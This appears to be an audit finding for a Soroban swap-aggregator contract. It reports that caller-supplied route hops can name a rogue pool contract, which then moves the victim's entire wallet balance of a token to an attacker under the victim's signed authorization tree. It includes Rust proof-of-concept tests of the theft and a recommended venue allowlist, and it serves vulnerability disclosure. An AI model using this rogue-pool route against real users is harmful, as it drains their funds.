### Title
Unallowlisted route venues let attacker-chosen pool code execute token transfers under the caller's authorization tree, draining wallet balances - (File: contracts/swap-aggregator/src/venues/mod.rs)

### Summary
CVE-2022-4317 describes a client that forwards sensitive headers to an attacker-controlled redirect destination. The lending analog: `execute_strategy` routes hops through pool addresses taken verbatim from the caller-supplied XDR payload with no allowlist (`SwapHop.pool` → `env.invoke_contract(pool, "swap", ...)`). An attacker who supplies the route can name a malicious contract as a hop `pool`; that code runs mid-transaction below the caller's `require_auth`, and any `token.transfer(caller → attacker)` it issues is recorded by Soroban as a child of the caller's authorization entry. If the caller signs the simulation-produced tree (the default wallet flow), the rogue transfer executes and moves tokens the protocol never touched. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
The router decodes `SwapHop` entries from untrusted `swap_xdr` and invokes whatever address `hop.pool` names. The threat model confirms "the router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization" [3](#0-2) . The dedicated harness test proves the mechanism end-to-end: `RogueHopPool::swap` calls `token::Client::transfer(victim, attacker, WALLET_BALANCE)`, and in enforcing mode the host accepts it exactly when the signed tree lists that child — which honest simulation produces automatically [5](#0-4) .

The same exposure exists through controller strategies (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`), which forward caller-provided route bytes to the configured router; the rogue hop then rides the caller's `require_auth` on the controller entrypoint rather than `execute_strategy`.

### Impact Explanation
Theft of user funds beyond the routed amount. The stolen balance is the victim's whole wallet holding of an arbitrary token (`WALLET_BALANCE = 77_770_000_000` in the test), "not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [6](#0-5) . The harness asserts Alice's unlisted-token balance goes to zero and the attacker's receives it, while the swap still settles fairly and all protocol invariants pass [7](#0-6) .

### Likelihood Explanation
Reachable by any unprivileged address that can get a victim to sign a swap carrying its route — the classic "phishing route" pattern the threat model itself assigns to clients to detect. It requires no privilege, no oracle manipulation, and no protocol misconfiguration; the only mitigation is out-of-contract client diligence ("a client must decode the route it signs and refuse an authorization tree with any other child") [8](#0-7) . Wallets that blindly sign simulated auth trees — the standard flow — are vulnerable. Medium severity: high impact conditioned on victim signing a poisoned tree.

### Recommendation
Restrict hop `pool`/`token` addresses to an admin- or governance-maintained venue allowlist in the router (and/or have the controller verify route venue addresses against listed markets), so arbitrary code cannot be placed beneath the caller's authorization. Alternatively, have the router run venue calls through a sub-contract that is never under the sender's auth scope. Document and enforce that controller-forwarded routes only name known pool addresses.

### Proof of Concept
The committed test `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` demonstrates it: a `swap_collateral`/router call routed through `RogueHopPool` with a fair min-out succeeds, transfers Alice's `WALLET_BALANCE` of an unlisted token to the attacker, and settles normally — while the identical route under an honest root-only tree is refused by host auth [9](#0-8) .

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
